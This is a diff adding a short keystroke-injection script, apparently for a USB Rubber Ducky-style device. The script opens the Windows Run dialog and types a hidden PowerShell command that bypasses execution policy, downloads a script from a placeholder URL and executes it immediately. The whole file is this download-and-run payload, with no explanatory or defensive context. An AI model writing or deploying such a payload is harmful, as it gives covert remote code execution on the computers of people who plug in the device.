@@ -1,0 +1,6 @@
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass irm XXXurlXXX | iex
+DELAY 500
+ENTER
